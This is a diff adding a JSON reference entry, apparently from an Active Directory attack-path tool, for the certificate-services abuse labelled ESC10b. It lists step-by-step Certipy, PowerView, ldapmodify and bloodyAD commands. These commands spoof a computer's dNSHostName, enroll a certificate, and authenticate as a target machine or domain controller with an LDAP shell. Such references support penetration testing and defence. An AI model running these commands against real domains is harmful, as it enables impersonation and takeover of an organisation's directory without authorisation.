@@ -1,0 +1,165 @@
+{
+    "ADCSESC10b": {
+        "meaning": "The principal has control over a victim computer with permission to enroll on one or more certificate templates configured to enable certificate authentication and require the dNSHostName of the enrollee included in the Subject Alternative Name (SAN). There is an affected Domain Controller configured to allow UPN certificate mapping. This allows impersonating any AD forest computer by manipulating the victim computer's dNSHostName and using UPN certificate mapping for authentication.",
+        "common": "",
+        "windows": {
+            "PowerView_Certipy": [
+                {
+                    "order": 1,
+                    "command": "Set-DomainObject -Identity VICTIM -Set @{'serviceprincipalname'='HOST/victim'}",
+                    "description": "Remove SPNs including dNSHostName on victim to avoid conflicts"
+                },
+                {
+                    "order": 2,
+                    "command": "pyinstaller ./Certipy.spec",
+                    "description": "Create Windows executable version of Certipy using PyInstaller"
+                },
+                {
+                    "order": 3,
+                    "command": "Certipy.exe account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM$ -dns TARGET.CORP.LOCAL",
+                    "description": "Set dNSHostName of victim computer to target computer's dNSHostName"
+                },
+                {
+                    "order": 4,
+                    "command": "Get-DomainObject -Identity VICTIM -Properties mail",
+                    "description": "Check if victim has mail attribute set (required for some templates)"
+                },
+                {
+                    "order": 5,
+                    "command": "Set-DomainObject -Identity VICTIM -Set @{'mail'='dummy@mail.com'}",
+                    "description": "Set mail attribute if required by certificate template"
+                },
+                {
+                    "order": 6,
+                    "command": "# Obtain session as victim computer using GenericAll control",
+                    "description": "Obtain session as SYSTEM on victim host for computer account access"
+                },
+                {
+                    "order": 7,
+                    "command": "Certipy.exe req -u VICTIM$ -p PWD -ca CA-NAME -target CA-SERVER -template TEMPLATE",
+                    "description": "Enroll certificate as victim computer with manipulated dNSHostName in SAN"
+                },
+                {
+                    "order": 8,
+                    "command": "Certipy.exe account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM$ -dns VICTIM.CORP.LOCAL",
+                    "description": "Restore victim dNSHostName to original value"
+                },
+                {
+                    "order": 9,
+                    "command": "Certipy.exe auth -pfx TARGET.pfx -dc-ip IP -ldap-shell",
+                    "description": "Perform Schannel authentication as target computer using UPN certificate mapping"
+                }
+            ],
+            "PowerView_Simple": [
+                {
+                    "order": 1,
+                    "command": "Set-DomainObject -Identity VICTIM_COMPUTER -Set @{'dnshostname'='DC01.domain.com'}",
+                    "description": "Set victim computer dNSHostName to target domain controller"
+                },
+                {
+                    "order": 2,
+                    "command": "# Obtain SYSTEM session on victim computer",
+                    "description": "Get computer account access via SYSTEM privileges"
+                },
+                {
+                    "order": 3,
+                    "command": "Certipy.exe req -u VICTIM$ -p password -ca CA-NAME -target CA-SERVER -template Machine",
+                    "description": "Enroll machine certificate with target dNSHostName using UPN mapping"
+                },
+                {
+                    "order": 4,
+                    "command": "Certipy.exe auth -pfx DC01.pfx -dc-ip DC_IP -ldap-shell",
+                    "description": "Authenticate as target DC using UPN certificate mapping"
+                }
+            ]
+        },
+        "linux": {
+            "Certipy": [
+                {
+                    "order": 1,
+                    "command": "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\ndelete: servicePrincipalName\\nservicePrincipalName: SPN\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
+                    "description": "Remove SPN entries including dNSHostName on victim"
+                },
+                {
+                    "order": 2,
+                    "command": "certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM$ -dns TARGET.CORP.LOCAL",
+                    "description": "Set dNSHostName of victim computer to target computer's dNSHostName"
+                },
+                {
+                    "order": 3,
+                    "command": "ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"VICTIM-DN\" mail",
+                    "description": "Check if victim has mail attribute set"
+                },
+                {
+                    "order": 4,
+                    "command": "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
+                    "description": "Set mail attribute if required by certificate template"
+                },
+                {
+                    "order": 5,
+                    "command": "# Obtain session as victim computer using GenericAll control",
+                    "description": "Obtain computer account access via control over computer object"
+                },
+                {
+                    "order": 6,
+                    "command": "certipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target CA-SERVER -template TEMPLATE",
+                    "description": "Enroll certificate as victim with dNSHostName in SAN"
+                },
+                {
+                    "order": 7,
+                    "command": "certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -dns VICTIM.CORP.LOCAL",
+                    "description": "Restore victim dNSHostName to original value"
+                },
+                {
+                    "order": 8,
+                    "command": "certipy auth -pfx TARGET.pfx -dc-ip IP -ldap-shell",
+                    "description": "Perform Schannel authentication as target computer using certificate"
+                }
+            ],
+            "LDAP_Manual": [
+                {
+                    "order": 1,
+                    "command": "echo -e \"dn: CN=VICTIM,CN=Computers,DC=domain,DC=com\\nchangetype: modify\\nreplace: dNSHostName\\ndNSHostName: target.domain.com\" | ldapmodify -x -D 'CN=attacker,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com",
+                    "description": "Set victim computer dNSHostName to target via LDAP"
+                },
+                {
+                    "order": 2,
+                    "command": "# Obtain computer account credentials or session",
+                    "description": "Get access to victim computer account for certificate enrollment"
+                },
+                {
+                    "order": 3,
+                    "command": "# Request certificate with manipulated dNSHostName for UPN mapping",
+                    "description": "Enroll certificate with target dNSHostName in SAN for UPN mapping"
+                },
+                {
+                    "order": 4,
+                    "command": "echo -e \"dn: CN=VICTIM,CN=Computers,DC=domain,DC=com\\nchangetype: modify\\nreplace: dNSHostName\\ndNSHostName: victim.domain.com\" | ldapmodify -x -D 'CN=attacker,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com",
+                    "description": "Restore victim dNSHostName after certificate enrollment"
+                },
+                {
+                    "order": 5,
+                    "command": "# Use certificate for Schannel authentication with UPN certificate mapping",
+                    "description": "Authenticate as target computer using UPN certificate mapping"
+                }
+            ],
+            "BloodyAD": [
+                {
+                    "order": 1,
+                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD set object 'CN=VICTIM,CN=Computers,DC=domain,DC=com' dNSHostName 'target.domain.com'",
+                    "description": "Set victim computer dNSHostName to target using BloodyAD"
+                },
+                {
+                    "order": 2,
+                    "command": "# Obtain victim computer session and enroll certificate for UPN mapping",
+                    "description": "Use computer account access to request certificate with UPN mapping"
+                },
+                {
+                    "order": 3,
+                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD set object 'CN=VICTIM,CN=Computers,DC=domain,DC=com' dNSHostName 'victim.domain.com'",
+                    "description": "Restore victim dNSHostName after certificate enrollment"
+                }
+            ]
+        }
+    }
+}
